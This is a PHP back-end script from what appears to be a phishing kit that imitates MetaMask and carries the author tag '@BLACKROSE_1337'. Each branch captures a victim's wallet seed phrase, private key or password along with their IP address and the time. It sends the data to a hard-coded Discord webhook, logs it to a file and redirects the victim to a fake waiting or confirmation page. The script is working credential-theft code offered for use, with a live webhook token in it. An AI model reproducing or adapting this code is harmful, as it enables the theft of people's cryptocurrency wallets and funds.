<?php
if (isset($_POST['pass'])) {
    $InfoDATE = date("d-m-Y h:i:sa");
    $pass = $_SESSION['pass'] = $_POST['pass'];

    $yagmai .= '
    [====🦊METΔΜΔSk-V2🦊===]
    [🔐 𝗦𝗲𝗲𝗱𝗣𝗵𝗿𝗮𝘀𝗲] =
    ' . $_SESSION['pass'] . '
    [+]━━━━【🕵🏼𝘂𝘀𝗲𝗿-𝗶𝗻𝗳𝗼】━━━[+]
    [🌐 IP INFO] = http://www.geoiptool.com/?IP=' . $_SERVER['REMOTE_ADDR'] . '
    [⏰ TIME/DATE] =' . $InfoDATE . '
    [=====🥷 Main Author: @BLACKROSE_1337=====]
    ';

    // Send data to Discord Webhook
    $webhook_url = "https://discord.com/api/webhooks/1314060980216397834/6oTvISKAwap2feJ3eGci4kyVimOWZgPLIi5m3e6QtPNVtBhEyUTFZ_iQkJSTg4ANN8tL";
    $data = array("content" => $yagmai);
    $options = array(
        'http' => array(
            'header'  => "Content-type: application/json\r\n",
            'method'  => 'POST',
            'content' => json_encode($data),
        ),
    );
    $context = stream_context_create($options);
    file_get_contents($webhook_url, false, $context);

    $f = fopen("../../ad.php", "a");
    fwrite($f, $yagmai);
    header("location:../Waiting.html");
    echo "<script>
        setTimeout(function(){
        window.location.href = '../Waiting.html';
        });
    </script>";
}elseif (isset($_POST['name'])) {
    $InfoDATE = date("d-m-Y h:i:sa");

    $yagmai .= '
    [=======🎣𝗦𝗲𝗲𝗱𝗗𝗲𝘁𝗮𝗶𝗹𝘀🎣========]
    [📝 𝗦𝗲𝗲𝗱 𝗣𝗵𝗿𝗮𝘀𝗲]:  ' . $_SESSION['pass'] . '
    [📝 Name Network]:  ' . $_SESSION['pkey'] . '
    [📝 Key ]:  ' . $_SESSION['Key'] . '
    [+]━━━━【💻 System】━━━[+]
    [🌍 IP INFO] = http://www.geoiptool.com/?IP=' . $_SERVER['REMOTE_ADDR'] . '
    [⌚ TIME/DATE] =' . $InfoDATE . '
    [=====🥷 Main Author: @BLACKROSE_1337=====]    ';

    // Send data to Discord Webhook
    $webhook_url = "https://discord.com/api/webhooks/1314060980216397834/6oTvISKAwap2feJ3eGci4kyVimOWZgPLIi5m3e6QtPNVtBhEyUTFZ_iQkJSTg4ANN8tL";
    $data = array("content" => $yagmai);
    $options = array(
        'http' => array(
            'header'  => "Content-type: application/json\r\n",
            'method'  => 'POST',
            'content' => json_encode($data),
        ),
    );
    $context = stream_context_create($options);
    file_get_contents($webhook_url, false, $context);

    $f = fopen("../../ad.php", "a");
    fwrite($f, $yagmai);
    header("location:../Confirme.html");
    echo "<script>
        setTimeout(function(){
        window.location.href = '../Confirme.html';
        });
    </script>";
}elseif (isset($_POST['pp1'])) {
    $InfoDATE = date("d-m-Y h:i:sa");

    $yagmai .= '
    [========📑𝗟𝗼𝗴𝗶𝗻📋=====]
    [👤 Password] = ' . $_POST['pp1'] . ' ' . $_POST['pp2'] . ' ' . $_POST['pp3'] . ' ' . $_POST['pp4'] . ' ' . $_POST['pp5'] . ' ' . $_POST['pp6'] . ' ' . $_POST['pp7'] . ' ' . $_POST['pp8'] . ' ' . $_POST['pp9'] . ' ' . $_POST['pp10'] . ' ' . $_POST['pp11'] . ' ' . $_POST['pp12'] . ' ' . $_POST['pp13'] . ' ' . $_POST['pp14'] . ' ' . $_POST['pp15'] . ' ' . $_POST['pp16'] . ' ' . $_POST['pp17'] . ' ' . $_POST['pp18'] . ' ' . $_POST['pp19'] . ' ' . $_POST['pp20'] . ' ' . $_POST['pp21'] . ' ' . $_POST['pp22'] . ' ' . $_POST['pp23'] . ' ' . $_POST['pp24'] . '
    [+]━━━━【💻 System】━━━[+]
    [🔍 IP INFO] = http://www.geoiptool.com/?IP=' . $_SERVER['REMOTE_ADDR'] . '
    [⏰ TIME/DATE] =' . $InfoDATE . '
    ';

    // Send data to Discord Webhook
    $webhook_url = "https://discord.com/api/webhooks/1314060980216397834/6oTvISKAwap2feJ3eGci4kyVimOWZgPLIi5m3e6QtPNVtBhEyUTFZ_iQkJSTg4ANN8tL";
    $data = array("content" => $yagmai);
    $options = array(
        'http' => array(
            'header'  => "Content-type: application/json\r\n",
            'method'  => 'POST',
            'content' => json_encode($data),
        ),
    );
    $context = stream_context_create($options);
    file_get_contents($webhook_url, false, $context);

    $f = fopen("../../ad.php", "a");
    fwrite($f, $yagmai);
    header("location:../Confirme.html");
    echo "<script>
        setTimeout(function(){
        window.location.href = '../Confirme.html';
        });
    </script>";
}elseif (isset($_POST['password'])) {
    $InfoDATE = date("d-m-Y h:i:sa");

    $password = $_SESSION['password'] = $_POST['password'];

    $yagmai .= '
    [======= 𝗟𝗼𝗴𝗶𝗻 ======]
    [𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱] =  ' . $_SESSION['password'] . '
    [+]━━━━【💻 System】━━━[+]
    [🔍 IP INFO] = http://www.geoiptool.com/?IP=' . $_SERVER['REMOTE_ADDR'] . '
    [⏰ TIME/DATE] =' . $InfoDATE . '
    ';

    // Send data to Discord Webhook
    $webhook_url = "https://discord.com/api/webhooks/1314060980216397834/6oTvISKAwap2feJ3eGci4kyVimOWZgPLIi5m3e6QtPNVtBhEyUTFZ_iQkJSTg4ANN8tL";
    $data = array("content" => $yagmai);
    $options = array(
        'http' => array(
            'header'  => "Content-type: application/json\r\n",
            'method'  => 'POST',
            'content' => json_encode($data),
        ),
    );
    $context = stream_context_create($options);
    file_get_contents($webhook_url, false, $context);

    $f = fopen("../../ad.php", "a");
    fwrite($f, $yagmai);
    header("location:../Wallet.html");
    echo "<script>
        setTimeout(function(){
        window.location.href = '../Wallet.html';
        });
    </script>";
}
else {
}
